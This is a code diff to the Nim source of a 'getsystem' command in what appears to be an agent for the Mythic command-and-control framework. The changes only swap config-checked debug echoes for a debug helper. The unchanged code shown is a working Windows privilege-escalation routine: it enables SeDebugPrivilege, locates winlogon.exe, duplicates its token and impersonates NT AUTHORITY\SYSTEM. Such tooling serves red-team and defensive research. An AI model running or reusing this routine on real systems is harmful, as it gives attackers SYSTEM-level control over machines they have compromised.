@@ -1,5 +1,5 @@
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import std/[json, strformat, strutils]
 import token_manager
 
@@ -76,30 +76,24 @@ when defined(windows):
 
 proc getsystem*(taskId: string, params: JsonNode): JsonNode =
   ## Elevate to SYSTEM by duplicating winlogon.exe token
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
-      if cfg.debug:
-        echo "[DEBUG] GetSystem: Starting elevation process"
+      debug "[DEBUG] GetSystem: Starting elevation process"
       
       # Get the username before elevation
       let oldUser = getCurrentUsername()
       
-      if cfg.debug:
-        echo &"[DEBUG] GetSystem: Current user: {oldUser}"
+      debug &"[DEBUG] GetSystem: Current user: {oldUser}"
       
       # Enable SeDebugPrivilege
       var hToken: HANDLE = 0
       if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hToken) != 0:
-        if cfg.debug:
-          echo "[DEBUG] GetSystem: Opened current process token"
+        debug "[DEBUG] GetSystem: Opened current process token"
         
         var luid: LUID
         let privName = newWideCString("SeDebugPrivilege")
         if LookupPrivilegeValueW(nil, privName, addr luid) != 0:
-          if cfg.debug:
-            echo "[DEBUG] GetSystem: Looked up SeDebugPrivilege"
+          debug "[DEBUG] GetSystem: Looked up SeDebugPrivilege"
           
           var tp = TOKEN_PRIVILEGES(
             PrivilegeCount: 1,
@@ -108,8 +102,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
           
           discard AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(TOKEN_PRIVILEGES)), nil, nil)
           
-          if cfg.debug:
-            echo "[DEBUG] GetSystem: Adjusted token privileges"
+          debug "[DEBUG] GetSystem: Adjusted token privileges"
         
         CloseHandle(hToken)
       
@@ -118,8 +111,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
       if snapshot == INVALID_HANDLE_VALUE:
         return mythicError(taskId, "Failed to create process snapshot")
       
-      if cfg.debug:
-        echo "[DEBUG] GetSystem: Created process snapshot"
+      debug "[DEBUG] GetSystem: Created process snapshot"
       
       # Find winlogon.exe
       var processEntry: PROCESSENTRY32W
@@ -132,8 +124,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
           let processName = $cast[WideCString](addr processEntry.szExeFile[0])
           if processName.toLowerAscii().contains("winlogon"):
             winlogonPid = processEntry.th32ProcessID
-            if cfg.debug:
-              echo &"[DEBUG] GetSystem: Found winlogon.exe with PID {winlogonPid}"
+            debug &"[DEBUG] GetSystem: Found winlogon.exe with PID {winlogonPid}"
             break
           
           if Process32NextW(snapshot, addr processEntry) == 0:
@@ -149,8 +140,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
       if processHandle == 0:
         return mythicError(taskId, &"Failed to open winlogon process: {GetLastError()}")
       
-      if cfg.debug:
-        echo "[DEBUG] GetSystem: Opened winlogon process"
+      debug "[DEBUG] GetSystem: Opened winlogon process"
       
       # Open process token
       var tokenHandle: HANDLE = 0
@@ -159,8 +149,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
         CloseHandle(processHandle)
         return mythicError(taskId, &"Failed to open process token: {err}")
       
-      if cfg.debug:
-        echo "[DEBUG] GetSystem: Opened winlogon token"
+      debug "[DEBUG] GetSystem: Opened winlogon token"
       
       # Duplicate the token
       var duplicatedToken: HANDLE = 0
@@ -177,8 +166,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
         CloseHandle(processHandle)
         return mythicError(taskId, &"Failed to duplicate token: {err}")
       
-      if cfg.debug:
-        echo "[DEBUG] GetSystem: Duplicated token"
+      debug "[DEBUG] GetSystem: Duplicated token"
       
       CloseHandle(tokenHandle)
       CloseHandle(processHandle)
@@ -189,8 +177,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
         CloseHandle(duplicatedToken)
         return mythicError(taskId, &"Failed to impersonate SYSTEM token: {err}")
       
-      if cfg.debug:
-        echo "[DEBUG] GetSystem: Impersonated SYSTEM token"
+      debug "[DEBUG] GetSystem: Impersonated SYSTEM token"
       
       # Store the token handle
       setTokenHandle(duplicatedToken)
@@ -198,8 +185,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
       # After getsystem, we're always NT AUTHORITY\SYSTEM (hardcoded like oopsie)
       let newUser = "NT AUTHORITY\\SYSTEM"
       
-      if cfg.debug:
-        echo &"[DEBUG] GetSystem: New user: {newUser}"
+      debug &"[DEBUG] GetSystem: New user: {newUser}"
       
       let output = &"Successfully elevated from {oldUser} to {newUser}"
       
